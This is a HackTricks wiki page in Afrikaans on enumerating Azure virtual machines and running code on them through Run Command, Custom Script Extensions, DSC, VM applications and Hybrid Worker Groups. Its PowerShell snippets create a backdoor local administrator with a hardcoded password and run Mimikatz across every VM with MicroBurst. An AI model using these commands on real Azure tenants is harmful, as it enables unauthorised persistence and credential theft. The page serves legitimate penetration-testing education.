# Az - Virtuele Masjiene & Netwerk

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese inligting

[Uit die dokumentasie:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuele masjiene is een van verskeie tipes [op aanvraag, skaalbare rekenaarbronne](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) wat Azure bied. Tipies kies jy 'n virtuele masjien wanneer jy meer beheer oor die rekenaaromgewing nodig het as wat die ander keuses bied. Hierdie artikel gee jou inligting oor wat jy moet oorweeg voordat jy 'n virtuele masjien skep, hoe jy dit skep, en hoe jy dit bestuur.

## Azure Netwerk Inligting

Azure netwerke bevat **verskillende entiteite en maniere om dit te konfigureer.** Jy kan 'n kort **beskrywings,** **voorbeelde** en **enumerasie** opdragte van die verskillende Azure netwerk entiteite vind in:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** bied 'n veilige, volledig bestuurde RDP (Remote Desktop Protocol) en SSH (Secure Shell) toegang oplossing oor SSL deur die Azure portaal. Dit is ge√Øntegreer binne 'n Azure Virtuele Netwerk, wat RDP en SSH konneksie na VM's met privaat IP's moontlik maak, wat die behoefte aan publieke IP's vermy. Dit maak dit 'n veiliger, meer gerieflike alternatief vir tradisionele metodes wat publieke IP toewysings en NSG re√´l konfigurasies vir VM toegang behels. Ontwikkelaars en IT-personeel kan veilig toegang tot VM's verkry vanaf die Azure portaal met hul webblaaiers, wat die proses vir ontwikkeling en toetsomgewings stroomlyn.

Om al die Azure Bastion Gashere in jou subskripsie te lys, kan jy die volgende opdrag gebruik:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Opname
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Voer opdragte in 'n VM uit**

### **AAD Teken in in VM**

Dit is moontlik om toegang te verleen aan gebruikers wat via AzureAD geverifieer is. Byvoorbeeld, om toegang te verkry tot 'n **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (dit is belangrik om die **e-pos** met die azurecorp te gebruik wanneer jy probeer om in te teken) kan jy 'n fout soos die volgende kry:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Volg net **daardie instruksies** deur na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) te gaan en die kode aan te dui, gebruik die e-pos en wagwoord as geloofsbriewe en jy sal in staat wees om via SSH te verbind (as daardie gebruiker genoegsame regte het om dit te doen: `Virtual Machine Administrator Login` of `Virtual Machine User Login` rol).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Voer Aangepaste Skrip Uitbreiding Uit**

Azure virtuele masjiene (VM) uitbreidings is **klein toepassings** wat post-implementasie konfigurasie en outomatisering **take** op **Azure VM's** bied. Byvoorbeeld, as 'n virtuele masjien sagteware-installasie, antivirusbeskerming of die vermo√´ benodig om 'n skrip binne-in dit uit te voer, kan jy 'n VM-uitbreiding gebruik.

Daarom, as jy toegang het om dit te skryf, kan jy arbitr√™re kode uitvoer:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) is 'n PowerShell-gereedskap soortgelyk aan Ansible, wat gebruik word om 'n gasheer deur kode op te stel. DSC integreer met Azure, wat die opgelaai van spesifieke konfigurasie-l√™ers moontlik maak. Hierdie l√™ers moet aan 'n streng sintaksis voldoen. Opmerklik is dat die DSC-uitbreiding in Azure opdragte kan uitvoer vanaf l√™ers wat aan sekere opmaakvereistes voldoen, selfs al is die sintaksis nie korrek volgens DSC-standaarde nie, soos in die verskafde figuur getoon.

Die uitvoering van hierdie opdragte word gefasiliteer deur die [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) funksie in Az PowerShell. Die vereistes sluit 'n **.PS1** l√™er met 'n gedefinieerde funksie in en die l√™er moet in 'n **.zip** l√™er gecomprimeer word. Alhoewel die sintaksis dalk nie akkuraat is vir DSC nie, sal die kode steeds uitgevoer word. Die uitbreiding sal egter die uitvoeringsstatus as "mislukking" merk, en geen uitvoer van die opdrag sal sigbaar wees nie weens die status wat deur die mislukkingboodskap oorgeskryf word.

### VM Application Definitions

VM Application Definitions stel die herhaalbare ontplooiing van geverifieerde toepassings op 'n Azure VM in staat. Hierdie hulpbron ondersteun die ontplooiing en opdatering van toepassings oor VMs. Om dit op te stel, is verskeie stappe nodig, wat opdragte soos **`New-AzGalleryApplication`** en **`New-AzGalleryApplicationVersion`** in Az PowerShell insluit.

Die uitvoering van toepassings of opdragte deur hierdie metode behels die **"VMAppExtension"**, wat outomaties ge√Ønstalleer word wanneer 'n toepassing op 'n VM toegepas word. Die uitbreiding haal die l√™er van die gespesifiseerde URI en noem dit presies soos die toepassing, sonder 'n uitbreiding. Om die l√™er korrek uit te voer, moet die "ManageActions" veld in die REST API-oproep geconfigureer word om die l√™er met die toepaslike uitbreiding te hernoem. Die opstelling van hierdie metode, eens voltooi, sal die struktuur vertoon soos in die verskafde figuur.

Hierdie metode van uitvoering is egter relatief stadig, wat ongeveer 3-4 minute neem om 'n toepassing of opdrag uit te voer. Die l√™ers wat met hierdie proses verband hou, word in spesifieke gidse gestoor (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` vir die toepassing kopie en `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` vir die uitvoeringsstatus).

Albei tegnieke bied unieke maniere om opdragte uit te voer en toepassings in Azure-omgewings te ontplooi, elk met sy eie stel vereistes, stappe en oorwegings.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) is 'n kenmerk in Azure wat Runbooks, geconfigureer in 'n Automatiseringsrekening, toelaat om op 'n Azure Virtuele Masjien (VM) wat deel uitmaak van die aangewese HWG, uitgevoer te word. Hierdie uitvoering word gefasiliteer deur 'n uitbreiding wat op die VM ge√Ønstalleer is, wat die Runbook-kode op die VM ontplooi. 'n Belangrike aspek van hierdie proses is dat die werklike akrediteer nie 'n faktor in uitvoering is nie omdat die kode met verhoogde voorregte loop, spesifiek as **SYSTEM** of root, soos in die verskafde figuur ge√Øllustreer.

'n Belangrike detail vir diegene wat Windows 10 VMs gebruik, is die noodsaaklikheid om die PowerShell-weergawe vir die Runbook spesifiek aan te dui. Dit moet ingestel word om as PowerShell Weergawe 5.1 te loop in plaas van 7.1. Hierdie vereiste spruit voort uit die feit dat PowerShell 7.1 nie standaard op hierdie VMs ge√Ønstalleer is nie, wat lei tot 'n mislukking in skripuitvoering as weergawe 7.1 gespesifiseer word.

Hierdie kenmerk van Azure bied 'n robuuste metode vir die outomatisering en bestuur van take oor hibriede omgewings, wat sentraliseerde bestuur en uitvoering van take op Azure VMs moontlik maak.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
